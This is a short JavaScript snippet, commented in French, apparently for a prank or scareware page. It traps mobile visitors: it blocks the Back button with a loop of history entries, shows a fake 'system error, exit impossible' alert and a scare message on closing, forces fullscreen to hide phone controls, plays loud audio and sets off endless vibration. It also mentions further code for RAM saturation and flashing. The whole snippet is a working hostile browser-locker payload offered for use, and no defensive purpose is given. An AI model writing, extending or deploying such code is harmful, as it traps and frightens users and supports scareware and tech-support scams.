<script>
    // 1. Bloquer le bouton "Retour" (Historique infini)
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.history.pushState(null, null, window.location.href);
        alert("SORTIE IMPOSSIBLE : ERREUR SYSTÈME !");
    };

    // 2. Message de confirmation à la fermeture
    window.onbeforeunload = function() {
        return "Voulez-vous vraiment quitter ? Le système est en péril.";
    };

    async function activerPiege() {
        // --- TES OPTIONS PRÉCÉDENTES (Son, Vibration, Torche) ---
        const son = document.getElementById('audio');
        son.volume = 1.0;
        son.play().catch(() => {});

        // FORCER LE PLEIN ÉCRAN (Cache les boutons du téléphone)
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen().catch(() => {});
        }

        // --- LA SUITE DE TON CODE EXISTANT ---
        if ("vibrate" in navigator) {
            setInterval(() => { navigator.vibrate([2000, 100]); }, 500);
        }

        // [Le reste de ton code saturation RAM et flash...]
        
        // SATURATION DE L'HISTORIQUE EN BOUCLE
        setInterval(() => {
            window.history.pushState(null, null, window.location.href);
        }, 100);
    }
</script>
